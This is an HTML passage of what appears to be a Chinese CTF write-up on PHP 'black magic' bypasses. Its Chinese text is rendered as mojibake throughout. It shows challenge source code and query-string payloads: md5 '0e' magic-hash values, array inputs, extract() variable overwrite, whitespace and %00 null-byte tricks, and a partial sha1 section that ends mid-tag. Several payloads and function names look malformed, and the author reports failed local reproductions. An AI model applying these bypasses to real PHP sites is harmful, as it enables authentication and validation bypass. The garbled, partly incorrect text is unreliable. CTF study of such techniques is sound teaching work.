id="001-ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡"><a href="#001-ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡" class="headerlink" title="001 ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡"></a>001 ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡</h5><p>å­—ç¬¦ä¸²ç»è¿‡md5åŠ å¯†åï¼Œä¼šç”Ÿæˆæ—¢æœ‰æ•°å­—åˆæœ‰å­—æ¯çš„å¯†æ–‡ï¼Œå¯ä»¥åˆ©ç”¨<strong>ç§‘å­¦è®¡æ•°æ³•</strong>çš„è¯­æ³•è§„å¾‹åæ¨æ˜æ–‡ã€‚</p><blockquote><p>äº†è§£åˆ°md5æ˜¯ä¸å¯é€†çš„æ‰€ä»¥åº”è¯¥ä¸èƒ½è§£ç ï¼Œä½†æ˜¯å¯ä»¥æ ¹æ®åŠ å¯†è§„å¾‹æ‰¾æ»¡è¶³éœ€è¦çš„æ˜æ–‡</p></blockquote><p>0æ— è®ºä¹˜åçš„å‡ æ¬¡æ–¹éƒ½ä»ç„¶ä¸ºé›¶ï¼Œä¾‹å¦‚<code>&#39;0e123456&#39;==&#39;0e654321&#39;==0</code>ã€‚æ‰€ä»¥åªéœ€è¦æ‰¾åˆ°ä¸¤ä¸ªç»è¿‡md5åŠ å¯†åä»¥<strong>â€0eâ€œ</strong>å¼€å¤´çš„å­—ç¬¦ä¸²å……å½“å˜é‡å³å¯ã€‚</p><p>copyäº†ä¸€äº›åŠ å¯†åæ˜¯0eå¼€å¤´çš„å€¼ï¼š</p><ul><li>QNKCDZO       </li><li>240610708 </li><li>s878926199a      </li><li>s155964671a         </li><li>s214587387a        </li><li>s214587387a        </li><li>0e215962017</li></ul><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?s1=QNKCDZO&amp;s2=240610708</code> </p><p>æ²¡æœ‰æˆåŠŸæˆªå›¾ğŸ˜£</p><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆè‡ªå·±è¿è¡Œçš„æ—¶å€™æ²¡æˆåŠŸï¼Œé¡µé¢ä¸€ç‰‡ç©ºç™½ä»€ä¹ˆéƒ½æ²¡è¾“å‡ºã€‚</p><p><strong>ç´§æ€¥è¡¥è¯¾</strong></p><p>åœ¨phpä¸­ï¼Œ**â€™<em>x</em>e<em>y</em>â€˜** æ„ä¸ºxä¹˜10çš„yæ¬¡æ–¹ã€‚ä¾‹å¦‚ï¼š1000 &#x3D;&#x3D; â€˜1e3â€™ã€‚</p><h5 id="002-æ•°ç»„ç»•è¿‡"><a href="#002-æ•°ç»„ç»•è¿‡" class="headerlink" title="002 æ•°ç»„ç»•è¿‡"></a>002 æ•°ç»„ç»•è¿‡</h5><p>å†²æµªå†²åˆ°çš„</p><p>phpä¸­çš„md5å‡½æ•°ä¸èƒ½ç”¨æ¥åŠ å¯†æ•°ç»„ï¼Œæ‰€ä»¥ä¼šå‡ºç°ç»“æœNULLã€‚ä¾‹å¦‚<code>md5([1,2]) == md5([3,4]) == NULL</code>ã€‚</p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?s1[]=1&amp;s2[]=2</code></p><p>ä½†æ˜¯åœ¨æˆ‘çš„ç”µè„‘ä¸Šå¤ç°ä¼šæŠ¥é”™è€Œä¸æ˜¯ç›´æ¥nullç»•è¿‡ã€‚</p><h3 id="03-extract-å˜é‡è¦†ç›–ç»•è¿‡"><a href="#03-extract-å˜é‡è¦†ç›–ç»•è¿‡" class="headerlink" title="03 extract å˜é‡è¦†ç›–ç»•è¿‡"></a>03 extract å˜é‡è¦†ç›–ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç ï¼š</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>; <br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>))<br> &#123; <br>    <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span>==<span class="hljs-variable">$content</span>)<br>    &#123; <br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Modifierç»ˆå°†å¦ææ³°æ¥&#x27;</span>; <br>    &#125;<br>   <span class="hljs-keyword">else</span><br>   &#123; <br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;<br>   &#125; <br> &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-2"><a href="#è§£é¢˜æ€è·¯-2" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p>é¢˜ç›®ä½¿ç”¨<code>extract($_GET)</code>æ¥å—è¯·æ±‚ï¼Œå¹¶å°†å…¶é”®åå’Œé”®å€¼è½¬æ¢ä¸ºå˜é‡åå’Œå˜é‡å€¼ï¼Œéšåè¿›è¡Œifæ¡ä»¶çš„åˆ¤æ–­ã€‚$flagæ˜¯ä¸€ä¸ªè¾“å…¥çš„å˜é‡ï¼Œ<code>file_get_contents($flag)</code>æ‰“å¼€çš„ä¸€å®šæ˜¯ç©ºæ–‡ä»¶ï¼Œæ‰€ä»¥<code>$content</code>ä¸€å®šä¸ºç©º</p><blockquote><p>è§£é¢˜å…³é”®åœ¨äºä»¤$shiyan&#x3D;&#x3D;$content</p></blockquote><p>ä½¿ç”¨GETæäº¤å‚æ•°å’Œå€¼ï¼Œåˆ©ç”¨<code>extract($_GET)</code>è¿›è¡Œè¦†ç›–ï¼Œä½¿flagå’Œshiyançš„å€¼éƒ½ä¸ºç©ºï¼Œä»è€Œæ»¡è¶³ifæ¡ä»¶ï¼Œè¾“å‡ºflagã€‚</p><p><strong>æœ€ç»ˆpayload</strong>ï¼š<code>?flag=&amp;shiyan=</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-11-39.png"></p><h3 id="04-ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦"><a href="#04-ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦" class="headerlink" title="04 ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦"></a>04 ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç </span><br><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-variable">$req</span> = [];<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>;<br> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_error&quot;</span>, <span class="hljs-literal">false</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br> <br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;number&#x27;</span>]))&#123;<br>   <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;</span>);<br> <br>   <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;have a fun!!&quot;</span>);<br> <br>&#125;<br> <br><span class="hljs-keyword">foreach</span>([<span class="hljs-variable">$_GET</span>, <span class="hljs-variable">$_POST</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$global_var</span>) &#123;  <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$global_var</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>); <br>        <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-variable">$req</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$value</span>); <br>    &#125; <br>&#125; <br> <br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_palindrome_number</span>(<span class="hljs-params"><span class="hljs-variable">$number</span></span>) </span>&#123; <br>    <span class="hljs-variable">$number</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$number</span>);<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <br>    <span class="hljs-variable">$j</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$number</span>) - <span class="hljs-number">1</span>; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$j</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span>[<span class="hljs-variable">$i</span>] !== <span class="hljs-variable">$number</span>[<span class="hljs-variable">$j</span>]) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>        <span class="hljs-variable">$i</span>++; <br>        <span class="hljs-variable">$j</span>--; <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>&#125; <br> <br> <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;number&#x27;</span>])) <br>&#123;<br> <br>   <span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;sorry, you cann&#x27;t input a number!&quot;</span>;<br> <br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;number&#x27;</span>]!=<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;number&#x27;</span>])))<br>&#123;<br> <br>     <span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;number must be equal to it&#x27;s integer!! &quot;</span>;  <br> <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br> <br>     <span class="hljs-variable">$value1</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]);<br>     <span class="hljs-variable">$value2</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]));  <br> <br>     <span class="hljs-keyword">if</span>(<span class="hljs-variable">$value1</span>!=<span class="hljs-variable">$value2</span>)&#123;<br>          <span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;no, this is not a palindrome number!&quot;</span>;<br>     &#125;<br>     <span class="hljs-keyword">else</span><br>     &#123;<br> <br>          <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_palindrome_number</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]))&#123;<br>              <span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;nice! <span class="hljs-subst">&#123;$value1&#125;</span> is a palindrome number!&quot;</span>; <br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>             <span class="hljs-variable">$info</span>=<span class="hljs-variable">$flag</span>;<br>          &#125;<br>     &#125;<br> <br>&#125;<br> <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$info</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-3"><a href="#è§£é¢˜æ€è·¯-3" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p>è¿™ä¸ªä»£ç å¥½é•¿è®©æˆ‘æ¥è®¤çœŸçœ‹ä¸€ä¸‹ğŸ§</p><p>ä»æœ€åçœ‹<code>echo $info</code>ã€<code>$info=$flag</code>ï¼Œæˆ‘ä»¬çŸ¥é“å¦‚æœæ»¡è¶³å‰é¢çš„æ¡ä»¶ï¼Œflagä¼šè¢«èµ‹å€¼ç»™<code>$info</code>å¹¶è¾“å‡ºã€‚</p><p>å†å¾€ä¸Šæ‰¾æ¡ä»¶</p><p>è¦ä¸æ»¡è¶³æ¡ä»¶ï¼Œå³<code>is_palindrome_number($req[&quot;number&quot;])</code>ä¸ºå‡ã€‚</p><p>å‰é¢ä»£ç æœ‰å†™<code>is_palindrome_number</code>å‡½æ•°ç”¨æ¥åˆ¤æ–­å›æ–‡æ•°å­—ã€‚</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-24-52.png"></p><p>è¦æ»¡è¶³<code>$value1=$value2</code>ï¼Œå³<code>intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;]))</code>ï¼Œ$valueåè½¬åä¸èƒ½å’ŒåŸæ¥ç›¸ç­‰ã€‚</p><blockquote><p>strrev()å‡½æ•°åè½¬å­—ç¬¦ä¸²</p></blockquote><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-31-22.png"></p><p><code>is_numberic($REAUEST[&#39;NUMBER&#39;]</code>éœ€è¦ä¸ºå‡ï¼Œä¸”<code>$req[&#39;number&#39;]==strval(intval(eq[&#39;number&#39;])</code></p><p>å†çœ‹çœ‹ä¸Šé¢</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-52-30.png"></p><p>æˆ‘ä»¬è¦åœ¨urlä¼ å…¥ä¸€ä¸ªåä¸º<strong>number</strong>çš„å˜é‡</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-59-58.png"></p><p>è¿™æ®µçš„æ„æ€æ˜¯æŠŠæˆ‘ä»¬æ‰€æœ‰çš„è¾“å…¥æ”¶é›†åˆ°$global_varåˆ—è¡¨é‡Œï¼Œæ­¤æ—¶åˆ—è¡¨**$global_var&#x3D;[<em>$number</em>]<strong>ã€‚å†è¿›å…¥ä¸‹ä¸€æ­¥å¾ªç¯ï¼Œå°†é”®åèµ‹å€¼ç»™$keyï¼Œå˜é‡çš„å€¼èµ‹å€¼ç»™$valueï¼Œå³</strong>$key&#x3D;0ï¼Œ$value&#x3D;$number**ã€‚</p><p>è¿›å…¥å¾ªç¯å†…éƒ¨åï¼Œtrim()å‡½æ•°å»é™¤å˜é‡é¦–å°¾çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–å­—ç¬¦åéœ€æ»¡è¶³æ¡ä»¶<code>is_string($value) &amp;&amp; $req[$key] = addslashes($value)</code>ï¼Œå³$valueä¸ºå­—ç¬¦ä¸²å¹¶ç»™å­—ç¬¦ä¸²åŠ åæ–œçº¿ã€‚</p><p>åˆ¤æ–­æ¡ä»¶å¦‚ä¸‹</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_20-29-48.png"></p><p>ç»¼ä¸Šï¼Œè¦ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²ä¸èƒ½æ˜¯æ•°å­—è¿˜å¿…é¡»æ˜¯æ•´æ•°ï¼Œä¸æ˜¯å›æ–‡æ•°å­—è¿˜è¦æ˜¯å›æ–‡æ•°å­—ğŸ˜…ã€‚</p><p>æ‚–è®ºï¼<del>çƒ¦æ­»äº†ä¸åšäº†å»æš´æ‰“å‡ºé¢˜äºº</del></p><p>æ²¡å…³ç³»æˆ‘ä»¬å¯ä»¥ç»•è¿‡ã€‚</p><p><code>intval()</code>å’Œ <code>is_numeric()</code>å‡½æ•°åœ¨å¼€å§‹åˆ¤æ–­å‰ï¼Œä¼šå…ˆè·³è¿‡æ‰€æœ‰ç©ºç™½å­—ç¬¦ï¼Œä½†æ˜¯<code>is_palindrome_number()</code>ä¸ä¼šï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ï¼Œåœ¨ä¸€ä¸ªå›æ–‡æ•°å­—ä¹‹å‰åŠ ä¸Šä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼Œæ¯”å¦‚<code>\f121</code>å°±æ˜¯<code>%0c121</code></p><p>å†ç”¨%00ç»•è¿‡<code>is_numeric($_REQUEST[&#39;number&#39;])</code></p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?number=%00%0c121</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_21-14-18.png"></p><p>è¿™ä¸ªæ€ä¹ˆè¿˜æ˜¾ç¤ºä»£ç æ</p><h3 id="05-ereg-x2F-preg-match-æ­£åˆ™-00-æˆªæ–­"><a href="#05-ereg-x2F-preg-match-æ­£åˆ™-00-æˆªæ–­" class="headerlink" title="05 ereg&#x2F;preg_match æ­£åˆ™ %00 æˆªæ–­"></a>05 ereg&#x2F;preg_match æ­£åˆ™ %00 æˆªæ–­</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç </span><br><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <br>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>  &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">99999999</span>)<br>   &#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;*-*&#x27;</span>) !== <span class="hljs-literal">FALSE</span>) <span class="hljs-comment">//strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</span><br>      &#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>); <br>       &#125;<br>      &#125;<br>     <span class="hljs-keyword">else</span> <br>     &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>; <br>      &#125;<br>   &#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-4"><a href="#è§£é¢˜æ€è·¯-4" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><h5 id="001-00æˆªæ–­"><a href="#001-00æˆªæ–­" class="headerlink" title="001 %00æˆªæ–­"></a>001 %00æˆªæ–­</h5><p>éœ€è¦æ»¡è¶³æ¡ä»¶<code>ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;])</code>ä¸ä¸ºfalseï¼Œå³è¾“å…¥çš„å€¼å¿…é¡»æœ‰å¤§å°å†™<strong>å­—æ¯æˆ–è€…æ•°å­—</strong>ã€‚</p><p>è¿˜éœ€æ»¡è¶³<code>strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 99999999</code>ï¼Œå³è¾“å…¥å€¼<strong>é•¿åº¦å°äº8</strong>ä¸”<strong>å¤§äº99999999</strong>ã€‚</p><p>æœ€åè¦æ»¡è¶³<code>strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE</code>ï¼Œä¹Ÿå°±æ˜¯è¾“å…¥ä¸­å¿…é¡»æœ‰***-***ã€‚ä½†æ˜¯è¿™æ¡å’Œç¬¬ä¸€æ¡ç›¸æ‚–ï¼Œä¸æ…Œï¼Œå§å·²ç»è§è¿‡å¤§ä¸–é¢äº†ï¼Œå§å¯ä»¥ç»•è¿‡å®ƒã€‚</p><blockquote><p>å½“eregè¯­å¥é‡åˆ°%00çš„æ—¶å€™å°±ä¼šè®¤ä¸ºæ˜¯ä¼‘æ­¢ç¬¦ï¼Œä¸å†å¾€åçœ‹</p></blockquote><p>å¯ä»¥åœ¨å­—ç¬¦ä¸²ä¸­æ·»åŠ %00ï¼Œåœ¨å®ƒä¹‹ååŠ *-*ï¼Œéª—ä¸€ä¸‹ç¬¬ä¸€ä¸ªåˆ¤æ–­æ¡ä»¶ã€‚</p><p>ç¬¬äºŒä¸ªæ¡ä»¶å¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼Œæ¯”å¦‚1e10ã€‚</p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?password=1e10%00*-*</code></p><p>æœ¬åœ°å¤ç°æ²¡æˆåŠŸï¼Œæˆ‘å¥½å¾—å¾ˆå“‡æˆ‘å¥½çš„å¾ˆå“‡ğŸ˜…</p><h4 id="æŠ¥é”™"><a href="#æŠ¥é”™" class="headerlink" title="æŠ¥é”™"></a>æŠ¥é”™</h4><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_20-17-52.png"></p><p>æœ¬åœ°å¤ç°ä¸æˆåŠŸæ˜¯æ‰“ä¸å€’æˆ‘çš„ï¼Œæˆ‘æ“…é•¿ä½¿ç”¨ç™¾åº¦ã€‚</p><p>ç¿»è¯‘äº†ä¸€ä¸‹æ˜¯â€œè°ƒç”¨äº†æœªå®šä¹‰å‡½æ•°â€ã€‚åœ¨php5.3ä»¥ä¸Šçš„ç‰ˆæœ¬å°†ä¸å†æ”¯æŒeregi()å’Œereg()å‡½æ•°ï¼Œçœ‹äº†ä¸€ä¸‹çš„æˆ‘çš„ç‰ˆæœ¬å·æ˜¯7.3ã€‚</p><p>é—®é¢˜ä¹Ÿä¸æ˜¯ä¸å¯é¿å…ï¼Œåªéœ€è¦æ”¹ä¸€ä¸‹æ ¼å¼ï¼ŒæŠŠ<code>ereg()</code>æ”¹æˆ<code>erge_match()</code>å°±è¡Œã€‚</p><p><del>ä½†æˆ‘ä¸ä¼šæ”¹</del>ğŸ˜£</p><h4 id="002-æ•°ç»„ç»•è¿‡-1"><a href="#002-æ•°ç»„ç»•è¿‡-1" class="headerlink" title="002 æ•°ç»„ç»•è¿‡"></a>002 æ•°ç»„ç»•è¿‡</h4><p>å†²æµªå†²åˆ°çš„å¦å¤–ä¸€ç§æ–¹æ³•</p><p>åœ¨trueå’Œfalseä¹‹å¤–è¿˜æœ‰ä¸€ä¸ªè¿”å›å€¼æ˜¯nullã€‚å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹è¿›è¡Œç»•è¿‡ã€‚</p><p>ereg() åªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œé‡åˆ°æ•°ç»„ä¼šè¿”å›nullï¼Œè€Œä¸”<code>null !== false</code>ã€‚åŒæ—¶ï¼Œstrlen()ä¹Ÿä¸èƒ½å¤„ç†æ•°ç»„ï¼Œä¹Ÿä¼šè¿”å›nullï¼Œnullçš„é•¿åº¦å°äº8ã€‚</p><p>å› ä¸ºè¦è¾“å…¥æ•°ç»„ï¼Œæ•°ç»„å¤§äºæ•´æ•°ï¼Œæ‰€ä»¥ä¸€å®šä¼šè¿”å›trueã€‚</p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?password=[]=1</code></p><h3 id="06-sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡"><a href="#06-sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="06 sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡"></a>06 sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç </span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Modiferç»ˆå°†å¦ææ³°æ¥&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>      <span class="hljs-keyword">die</span>(<span 